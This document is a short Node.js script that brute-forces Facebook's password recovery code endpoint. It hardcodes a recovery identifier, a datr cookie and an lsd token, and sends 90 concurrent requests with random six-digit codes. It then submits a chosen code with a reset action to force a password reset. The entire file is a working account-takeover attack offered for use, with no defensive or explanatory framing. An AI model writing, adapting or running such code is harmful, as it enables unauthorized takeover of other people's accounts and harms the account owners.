'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand, randomString } = helpers;

const httpClient = new Http2Client(true);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  const cuid = 'AYg3NsKxYTJgAFQO5ri3Xj_sTwJ3fcJyuYNhOnffAdLMgDVRNy-iwSfet9ULE1blpG6ZQa-YnDceE4rqnB7ecCXhbFE2HV6k9oYbmXO0UyeF_u8214biXCcBBfOpoEG_v6NfjOSYV2P6crcfPHueyMbpEWO92BIg7ML9SKNj7207bQ';
  const datr = 'CHcxaGrLANyT5uQTqzVlWKPK';
  const lsd = 'AVq1Av4-p_k';
  const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr='+datr,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };
  // const codes = require('./codes');

  // child_process.exec('siren warn');

  const p = [];
  for (let i = 0, code; 90 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'jazoest=2907&lsd='+lsd+'&n='+542534+'&reset_action=1').then(res => log(res.statusCode));
  });
})();